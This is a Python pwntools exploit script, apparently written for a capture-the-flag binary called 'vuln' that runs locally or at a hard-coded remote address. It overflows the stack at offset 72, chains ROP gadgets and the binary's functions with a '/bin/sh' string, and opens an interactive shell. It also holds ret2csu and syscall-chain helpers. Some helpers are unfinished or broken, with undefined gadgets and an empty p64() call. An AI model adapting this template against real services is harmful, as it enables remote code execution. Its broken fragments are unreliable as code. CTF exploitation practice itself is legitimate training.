from pwn import *

HOST = "103.152.242.116"
PORT = "20371"

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def syscall(rax, rdi, rsi, rdx):
    payload = p64(pop_rax) + p64(rax)
    payload += p64(pop_rdi) + p64(rdi)
    payload += p64(pop_rsi) + p64(rsi)
    payload += p64(pop_rdx) + p64(rdx) + p64(0)
    payload += p64(syscall_ret)

    return payload


def ret2csu(
    call_func,
    rdi=0,
    rsi=0,
    rdx=0,
    rbx=0,
    rbp=1,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
):
    # First __libc_csu_init POPPER rbx, rbp, r12, r13, r14, r15
    payload = p64(FIRST_POPPER)
    payload += p64(rbx)  # Fill rbx with 0
    payload += p64(rbp)  # Set RBP to 1 to pass CMP
    payload += p64(call_func)  # call _init to padding the stack
    payload += p64(rdi)  # RDI
    payload += p64(rsi)  # RSI
    payload += p64(rdx)  # RDX
    # Second __libc_csu_init MOV rdx, rsi, edi
    payload += p64(SECOND_POPPER)
    payload += p64(0)  # Padding rsp+8
    payload += p64(rbx)
    payload += p64(rbp)
    payload += p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    return payload

# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *main+8
b *a
b *b
c
c
c
""".format(
    **locals()
)

# Binary filename
exe = "./vuln"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

POP_RDI = 0x00000000004011fb
POP_RSI_R15 = 0x00000000004011f9

# Pass in pattern_size, get back EIP/RIP offset
offset = 72

# Start program
io = start()

def set_rdi(rdi, rsi):
  payload = p64()
  

# Build the payload
payload = flat({offset: [
  p64(POP_RSI_R15),
  b"/bin/sh\x00",
  p64(0),
  p64(elf.sym.a),
  p64(elf.sym.e),
  p64(elf.sym.f),
  p64(elf.sym.g),
  p64(elf.sym.c),
  p64(elf.sym.h),
  p64(elf.sym.b),
]})

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
